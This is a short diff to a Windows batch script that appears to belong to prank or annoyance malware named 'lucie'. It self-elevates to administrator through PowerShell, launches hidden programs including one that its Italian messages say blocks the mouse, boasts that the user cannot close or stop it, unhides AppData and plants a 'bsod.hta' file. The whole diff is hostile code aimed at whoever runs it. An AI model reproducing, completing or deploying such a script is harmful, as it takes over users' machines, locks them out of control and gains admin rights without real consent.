@@ -8,11 +8,12 @@ if NOT exist "%userprofile%\AppData\Local\identifyl" goto worm
 :worm
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 cd "%mypath%\lucieengine"
-start /min "" Starta.bat
+start /min "" ILMAUS.exe
+echo la lucie gradisce bloccare i mouse
 start /min "" sera.exe
-echo la lucie non vuole che tu puoi chiudermi!
+echo la lucie non vuole che tu possa chiudermi!
 start /min "" Merge.bat
-echo la lucie non vuole che tu puoi fermarmi!
+echo la lucie non vuole che tu possa fermarmi!
 attrib -h -s "%userprofile%\AppData"
 echo.
 copy "bsod.hta" "%userprofile%\AppData\Local\bsod.hta"
